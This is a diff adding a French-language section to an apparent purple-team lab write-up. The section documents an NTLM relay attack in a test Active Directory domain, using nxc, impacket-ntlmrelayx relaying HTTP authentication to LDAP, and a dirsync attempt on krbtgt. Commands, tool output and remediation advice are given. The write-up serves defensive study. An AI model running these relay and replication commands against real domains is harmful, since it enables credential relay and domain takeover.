@@ -322,3 +322,71 @@ Résultat : `svc_sql` cassé, mot de passe `Welcome2026!` en clair.
 - Un ciblage via BloodHound (plutôt qu'un kerberoasting massif) évite de faire du bruit inutile sur tous les comptes à SPN et concentre l'effort sur les chemins d'escalade pertinents.
 - La découverte de `svc-http` montre qu'un audit Kerberoasting révèle souvent des comptes oubliés ou non documentés — une bonne raison d'auditer systématiquement **tous** les comptes à SPN en environnement réel, et pas seulement les cibles anticipées.
 - Remédiation : mots de passe longs et aléatoires pour les comptes de service (25+ caractères), rotation régulière, et usage de **gMSA (Group Managed Service Accounts)** pour éliminer le risque de mot de passe statique cassable hors-ligne.
+
+
+## NTLM Relay — Responder/ntlmrelayx et impact sur un compte Administrateur
+
+### Reconnaissance initiale — SMB signing
+
+```bash
+nxc smb 192.168.10.0/24 --gen-relay-list relay_targets.txt
+```
+
+Résultat : les deux hôtes (`DC01`, `WIN11`) affichent `signing:True` — le SMB signing est actif sur les deux machines, ce qui **bloque le relay SMB→SMB/LDAP classique** par défaut sur des environnements Windows Server 2022/11 récents. Aucune cible exploitable n'a donc été retournée par `--gen-relay-list`.
+
+![nxc gen-relay-list signing true](media/purple-team/22-nxc-gen-relay-list-signing-true.png)
+
+### Pivot — relay via HTTP vers LDAP
+
+Le SMB signing ne protège pas les autres protocoles. `ntlmrelayx` a été lancé pour relayer toute authentification NTLM interceptée (SMB ou HTTP) vers LDAP sur le contrôleur de domaine :
+
+```bash
+impacket-ntlmrelayx -t ldap://192.168.10.1 -smb2support
+```
+
+Une première tentative de connexion SMB (`dir \\IP_Kali\test` depuis WIN11) a confirmé le blocage par signing. Le pivot vers HTTP a réussi :
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.10.20/test" -UseDefaultCredentials
+```
+
+Résultat côté `ntlmrelayx` :
+
+```
+[*] (HTTP): Authenticating connection from LABO/ADMINISTRATEUR@192.168.10.10 against ldap://192.168.10.1 SUCCEED [1]
+[*] User privileges found: Create user
+[*] User privileges found: Adding user to a privileged group (Administrateurs de l'entreprise)
+[*] User privileges found: Modifying domain ACL
+```
+
+Le compte **`LABO\Administrateur`** a été capturé et authentifié avec succès via relay HTTP→LDAP, avec confirmation de privilèges critiques (création de compte, ajout au groupe Enterprise Admins, modification des ACL du domaine).
+
+### Limite rencontrée — absence de LDAPS
+
+Toute exploitation nécessitant un canal chiffré (création de compte, DCSync via `dirsync`) a échoué :
+
+```
+Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
+ldap3.core.exceptions.LDAPStartTLSError: startTLS failed - unavailable
+```
+
+Vérifications effectuées pour confirmer la cause racine :
+- `Get-ChildItem Cert:\LocalMachine\My` sur le DC : **aucun certificat installé**
+- `openssl s_client -connect 192.168.10.1:636` : handshake TLS échoue immédiatement (`errno=104`, 0 byte échangé), malgré le port 636 ouvert (`nmap` confirme `ldapssl open`)
+
+Une session LDAP interactive (`impacket-ntlmrelayx -i`) a permis de confirmer la chaîne jusqu'au bout via la commande `dirsync`, utilisée pour simuler une réplication DRS (équivalent DCSync) :
+
+```
+dirsync (sAMAccountName=krbtgt) unicodePwd
+```
+
+L'objet `krbtgt` a bien été répliqué (GUID, SID, sAMAccountName confirmés), mais l'attribut `unicodePwd` est revenu **vide** — confirmation que le DC refuse de répliquer les attributs secrets sur un canal non chiffré.
+
+![dirsync krbtgt unicodePwd empty](media/purple-team/23-dirsync-krbtgt-unicodepwd-empty.png)
+
+### Enseignement
+
+- Le SMB signing actif par défaut sur les versions récentes de Windows bloque efficacement le relay SMB→SMB/LDAP classique — mais **n'importe quel protocole HTTP/WebDAV authentifié en NTLM reste exploitable** si la victime ne force pas un canal alternatif.
+- La chaîne d'attaque a été démontrée comme **entièrement fonctionnelle techniquement** jusqu'à l'énumération des privilèges d'un compte Enterprise Admin capturé en clair ; seule l'absence de certificat LDAPS (aucune PKI/AD CS déployée dans ce lab) a empêché l'exploitation finale (création de compte ou DCSync complet).
+- Cette limite est spécifique à l'environnement de lab : la majorité des domaines d'entreprise réels disposent d'AD CS et de LDAPS fonctionnel, rendant cette attaque pleinement exploitable dans ces contextes.
+- Remédiation : forcer le SMB signing sur **tous** les hôtes du domaine (pas seulement ceux testés), désactiver NTLM au profit de Kerberos uniquement quand possible (`Network security: Restrict NTLM`), et surveiller les authentifications NTLM atypiques (ex: comptes à privilèges s'authentifiant vers des hôtes non habituels) via SIEM.
